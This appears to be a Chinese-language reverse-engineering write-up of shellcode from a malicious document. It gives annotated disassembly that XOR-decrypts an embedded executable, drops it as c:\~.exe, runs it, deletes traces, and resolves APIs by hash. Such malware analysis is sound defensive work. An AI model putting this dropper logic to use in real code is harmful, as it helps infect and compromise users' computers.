
# 汇编代码

```
00B88AAD    53              push    ebx
00B88AAE    6A 04           push    4                                ;读取 4 个字节  值为 18BA5
00B88AB0    8D5F 04         lea     ebx, dword ptr [edi+4]
00B88AB3    53              push    ebx
00B88AB4    FF77 60         push    dword ptr [edi+60]
00B88AB7    FF57 2C         call    dword ptr [edi+2C]               ReadFile   刚才打开的 c:\\~$
00B88ABA    FF77 04         push    dword ptr [edi+4]                ; size 18BA5
00B88ABD    6A 40           push    40
00B88ABF    FF57 1C         call    dword ptr [edi+1C]               GlobalAlloc
00B88AC2    8947 5C         mov     dword ptr [edi+5C], eax
00B88AC5    8B5F 04         mov     ebx, dword ptr [edi+4]
00B88AC8    83C3 04         add     ebx, 4
00B88ACB    F7D3            not     ebx
00B88ACD    43              inc     ebx
00B88ACE    6A 02           push    2
00B88AD0    6A 00           push    0
00B88AD2    53              push    ebx
00B88AD3    FF77 60         push    dword ptr [edi+60]
00B88AD6    FF57 38         call    dword ptr [edi+38]               ; SetFilePointer  ;位置 11400
00B88AD9    6A 00           push    0
00B88ADB    8D9F A0000000   lea     ebx, dword ptr [edi+A0]
00B88AE1    53              push    ebx
00B88AE2    FF77 04         push    dword ptr [edi+4]                ; size 18BA5
00B88AE5    FF77 5C         push    dword ptr [edi+5C]
00B88AE8    FF77 60         push    dword ptr [edi+60]
00B88AEB    FF57 2C         call    dword ptr [edi+2C]               ;ReadFile
00B88AEE    FF77 60         push    dword ptr [edi+60]
00B88AF1    FF57 28         call    dword ptr [edi+28]               ;CloseHandle   拷贝的 ~$ doc file
00B88AF4    8B47 04         mov     eax, dword ptr [edi+4]
00B88AF7    8B5F 5C         mov     ebx, dword ptr [edi+5C]
00B88AFA    8033 81         xor     byte ptr [ebx], 81              ; exe 文件解密
00B88AFD    43              inc     ebx
00B88AFE    48              dec     eax
00B88AFF    83F8 00         cmp     eax, 0
00B88B02  ^ 75 F6           jnz     short 00B88AFA
00B88B04    6A 00           push    0
00B88B06    68 80000000     push    80
00B88B0B    6A 02           push    2
00B88B0D    6A 00           push    0
00B88B0F    6A 00           push    0
00B88B11    68 00000040     push    40000000
00B88B16    FF77 10         push    dword ptr [edi+10]
00B88B19    FF57 24         call    dword ptr [edi+24]                 ;CreateFileW  创建 c:\\~.exe
00B88B1C    8947 64         mov     dword ptr [edi+64], eax
00B88B1F    6A 00           push    0
00B88B21    8D9F A0000000   lea     ebx, dword ptr [edi+A0]
00B88B27    53              push    ebx
00B88B28    FF77 04         push    dword ptr [edi+4]                   ; size 18BA5
00B88B2B    FF77 5C         push    dword ptr [edi+5C]
00B88B2E    50              push    eax
00B88B2F    FF57 30         call    dword ptr [edi+30]                  ;WriteFile
00B88B32    6A 00           push    0
00B88B34    8D9F A0000000   lea     ebx, dword ptr [edi+A0]
00B88B3A    53              push    ebx
00B88B3B    68 FF000000     push    0FF                                ;
00B88B40    FF77 14         push    dword ptr [edi+14]                  ;
00B88B43    FF77 64         push    dword ptr [edi+64]                  ; exe handle
00B88B46    FF57 30         call    dword ptr [edi+30]                  ;WriteFile
00B88B49    FF77 64         push    dword ptr [edi+64]
00B88B4C    FF57 28         call    dword ptr [edi+28]                  ;CloseHandle   exe handle
00B88B4F    FF77 5C         push    dword ptr [edi+5C]
00B88B52    FF57 20         call    dword ptr [edi+20]                  ;GlobalFree
00B88B55    6A 00           push    0
00B88B57    FFB7 80000000   push    dword ptr [edi+80]
00B88B5D    FF57 3C         call    dword ptr [edi+3C]                  ;WinExec
00B88B60    FF77 0C         push    dword ptr [edi+C]                   ; c:\\~$
00B88B63    FF57 34         call    dword ptr [edi+34]                  ; DeleteFile
00B88B66    6A 00           push    0
00B88B68    FF57 44         call    dword ptr [edi+44]                  ;ExitProcess
;********************************************************************************
```

## 获取 API 入口地址的子函数

```
00B88B6B    55              push    ebp
00B88B6C    8BEC            mov     ebp, esp
00B88B6E    57              push    edi
00B88B6F    8B7D 08         mov     edi, dword ptr [ebp+8]
00B88B72    8B5D 0C         mov     ebx, dword ptr [ebp+C]            ;Kernel32.dll
00B88B75    56              push    esi
00B88B76    8B73 3C         mov     esi, dword ptr [ebx+3C]
00B88B79    8B741E 78       mov     esi, dword ptr [esi+ebx+78]
00B88B7D    03F3            add     esi, ebx
00B88B7F    56              push    esi
00B88B80    8B76 20         mov     esi, dword ptr [esi+20]
00B88B83    03F3            add     esi, ebx
00B88B85    33C9            xor     ecx, ecx
00B88B87    49              dec     ecx
00B88B88    41              inc     ecx
00B88B89    AD              lods    dword ptr [esi]
00B88B8A    03C3            add     eax, ebx
00B88B8C    56              push    esi
00B88B8D    33F6            xor     esi, esi
00B88B8F    0FBE10          movsx   edx, byte ptr [eax]
00B88B92    3AF2            cmp     dh, dl
00B88B94    74 08           je      short 00B88B9E
00B88B96    C1CE 0D         ror     esi, 0D
00B88B99    03F2            add     esi, edx
00B88B9B    40              inc     eax
00B88B9C  ^ EB F1           jmp     short 00B88B8F
00B88B9E    3BFE            cmp     edi, esi
00B88BA0    5E              pop     esi
00B88BA1  ^ 75 E5           jnz     short 00B88B88
00B88BA3    5A              pop     edx
00B88BA4    8BEB            mov     ebp, ebx
00B88BA6    8B5A 24         mov     ebx, dword ptr [edx+24]
00B88BA9    03DD            add     ebx, ebp
00B88BAB    66:8B0C4B       mov     cx, word ptr [ebx+ecx*2]
00B88BAF    8B5A 1C         mov     ebx, dword ptr [edx+1C]
00B88BB2    03DD            add     ebx, ebp
00B88BB4    8B048B          mov     eax, dword ptr [ebx+ecx*4]
00B88BB7    03C5            add     eax, ebp
00B88BB9    5E              pop     esi
00B88BBA    5F              pop     edi
00B88BBB    5D              pop     ebp
00B88BBC    C2 0800         retn    8
00B88BBF    E8 91FDFFFF     call    00B88955
```

## 数据区

```
00B88BC4  00 20 0A 00 63 00 3A 00 5C 00 7E 00 24 00 00 00  .  ..c.:.\\.~.$...
00B88BD4  63 00 3A 00 5C 00 7E 00 2E 00 65 00 78 00 65 00   c.:.\\.~...e.x.e.
00B88BE4  00 00 63 3A 5C 7E 2E 65 78 65                    ..c:\\~.exe
```
